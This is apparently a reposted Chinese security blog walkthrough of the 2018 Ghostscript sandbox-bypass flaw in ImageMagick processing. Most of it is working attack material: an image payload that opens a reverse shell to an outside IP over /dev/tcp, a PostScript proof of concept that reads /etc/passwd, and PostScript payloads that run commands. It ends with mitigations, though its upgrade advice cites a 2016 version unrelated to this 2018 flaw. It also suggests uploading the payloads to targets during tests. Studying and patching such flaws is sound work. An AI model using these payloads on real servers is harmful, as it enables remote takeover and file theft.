---
layout:     post
title:      ImageMagick安全详解
date:       2019-1-12
author:     Wh0ale
header-img: img/1.jpg
catalog: true
tags:
    - rce
---

## 一、漏洞信息

| 项目     | 描述                                                         |
| :------- | ------------------------------------------------------------ |
| 漏洞名称 | GhostScript 沙箱绕过（命令执行）漏洞                         |
| 漏洞作者 | Tavis Ormandy                                                |
| CVE编号  | 暂未分配                                                     |
| 漏洞描述 | 攻击者利用此漏洞可以上传恶意构造的图像文件，当目标服务器在对图像进行裁剪、转换等处理时即会执行攻击者指定的命令。 |
| 影响范围 | <= 9.23（全版本，全平台）                                    |
| 披露时间 | 2018-08-21                                                   |

## 二、复现环境

- OS：Ubuntu 14.10
- Ghostscript version：9.23（当下最新版本）
- Imagemagic version：7.0.8（当下最新版本）

## 三、环境搭建

#### 3.1 安装Ghostscript

```bash
c0ny1@Ubuntu ~$ cd /usr/local
c0ny1@Ubuntu /usr/local$ wget https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs923/ghostscript-9.23.tar.gz
c0ny1@Ubuntu /usr/local$ tar zxvf ghostscript-9.23.tar.gz
c0ny1@Ubuntu /usr/local$ cd ghostscript-9.23
c0ny1@Ubuntu /usr/local/ghostscript-9.23$ ./configure --prefix=/usr
c0ny1@Ubuntu /usr/local/ghostscript-9.23$ mkdir obj
c0ny1@Ubuntu /usr/local/ghostscript-9.23$ mkdir bin
c0ny1@Ubuntu /usr/local/ghostscript-9.23$ make all
c0ny1@Ubuntu /usr/local/ghostscript-9.23$ sudo make install
c0ny1@Ubuntu /usr/local/ghostscript-9.23$ gs -v #检查是否安装成功
GPL Ghostscript 9.23 (2018-03-21)
Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
```

#### 3.2 安装Imagemagic

```
c0ny1@Ubuntu /usr/local$ wget https://github.com/ImageMagick/ImageMagick/archive/7.0.8-9.tar.gz
c0ny1@Ubuntu /usr/local$ tar zxvf 7.0.8-9.tar.gz
c0ny1@Ubuntu /usr/local$ cd ImageMagick-7.0.8-9/
c0ny1@Ubuntu /usr/local/ImageMagick-7.0.8-9$ ./configure --prefix=/usr
c0ny1@Ubuntu /usr/local/ImageMagick-7.0.8-9$ make
c0ny1@Ubuntu /usr/local/ImageMagick-7.0.8-9$ make install
c0ny1@Ubuntu /usr/local/ImageMagick-7.0.8-9$ sudo ldconfig /usr/local/lib #使用新增的动态链接库生效
c0ny1@Ubuntu /usr/local/ImageMagick-7.0.8-9$ convert -version #检查是否安装成功
Version: ImageMagick 7.0.8-9 Q16 i686 2018-08-26 https://www.imagemagick.org
Copyright: ? 1999-2018 ImageMagick Studio LLC
License: https://www.imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP 
Delegates (built-in):
```

## 四、漏洞验证

#### 4.1 检测脚本

```bash
$ git clone https://github.com/ImageTragick/PoCs.git 
$ cd PoCs 
$ ./test.sh 
```

在自己服务器（此处演示为103.21.140.84）上开启监听端口7890

```bash
$ nc -vvl 7890 
```

将以下保存为test.jpg，上传到对应图片处理处。

```
push graphic-context 
viewbox 0 0 640 480 
fill 'url(https://example.com/image.jpg"|bash -i >& /dev/tcp/103.21.140.84/7890 0>&1")' 
pop graphic-context 
```

在自己服务器（此处演示为103.21.140.84）上查看是否有反弹SHELL



#### 4.2 读文件

读取/etc/passwd文件内容的poc：

```
/FileToSteal (/etc/passwd) def
errordict /undefinedfilename {
    FileToSteal % save the undefined name
} put
errordict /undefined {
    (STOLEN: ) print
    counttomark {
        ==only
    } repeat
    (\n) print
    FileToSteal
} put
errordict /invalidfileaccess {
    pop
} put
errordict /typecheck {
    pop
} put
FileToSteal (w) .tempfile
statusdict
begin
    1 1 .setpagesize
end
quit
```

将以上poc保存为poc.ps文件，并执行以下命令。

```
gs -q -sDEVICE=ppmraw -dSAFER  poc.ps
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz2wnorhx2j20k90d2q6g.jpg)

#### 4.3命令执行

ubuntu poc：

```
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

centos poc：

```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

这里我们是linux是Ubuntu发行版，故选择第一个poc进行测试。将以上poc保存为poc.jpg文件，并执行以下命令,测试对恶意图片文件进行格式转换。

```
/usr/local/bin/convert poc.jpg poc.jpg
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fz2woh43y3j20k706o0ua.jpg)

**注意：** 漏洞作者的[《More Ghostscript Issues: Should we disable PS coders in policy.xml by default?》](http://seclists.org/oss-sec/2018/q3/142)这篇文章里的convert命令不是ghostscript的，而是它的上游应用。可以是imagemagick，也可以是graphicsmagick。经过测试两个软件的convert命令都存在漏洞,我们这里复测的事imagemagick。

## 五、修复方式

升级ImageMagick至最新的[2016-05-09 7.0.1-3](http://www.imagemagick.org/script/binary-releases.php)版本。

如果无法快速升级，先临时做好以下两点：

1. 处理图片前，先检查图片的magic      bytes，也就是图片头，如果图片头不是你想要的格式，那么就不调用ImageMagick处理图片。如果你是php用户，可以使用getimagesize函数来检查图片格式，而如果你是wordpress等web应用的使用者，可以暂时卸载ImageMagick，使用php自带的gd库来处理图片。
2. 使用policy file来防御这个漏洞，这个文件默认位置在      /etc/ImageMagick/policy.xml ，我们通过配置如下的xml来禁止解析https等敏感操作：

```
<policymap> 

  <policy domain="coder"
rights="none" pattern="EPHEMERAL" />

  <policy domain="coder"
rights="none" pattern="URL" />

  <policy domain="coder"
rights="none" pattern="HTTPS" />

  <policy domain="coder"
rights="none" pattern="MVG" />

  <policy domain="coder"
rights="none" pattern="MSL" />

  <policy domain="coder"
rights="none" pattern="TEXT" />

  <policy domain="coder"
rights="none" pattern="SHOW" />

  <policy domain="coder"
rights="none" pattern="WIN" />

  <policy domain="coder"
rights="none" pattern="PLT" />

</policymap>
```



## 六、总结

ghostscript的上游应用有imagemagick，libmagick，graphicsmagick，gimp，python-matplotlib，texlive-core，texmacs，latex2html，latex2rtf等，其中ImageMagick受该漏洞影响最为严重。有相当多的网站，博客，媒体平台和流行的CMS（WordPress，Drupal等）在使用ImageMagick来进行图像处理。 **故在日常渗透测试中，可以上传带有dnslog测试的poc，来测试目标网站是否存在该漏洞。**

## 参考文章

- <https://github.com/vulhub/vulhub/tree/master/ghostscript/9.23-rce>
- [More Ghostscript Issues: Should we disable PS coders in policy.xml by default?](http://seclists.org/oss-sec/2018/q3/142)
- [imagemaick的ghost script RCE漏洞](http://www.cnblogs.com/ermei/p/9520184.html)



转自：

[http://gv7.me/articles/2018/ghostscript-rce-20180821/](http://gv7.me/articles/2018/ghostscript-rce-20180821/)



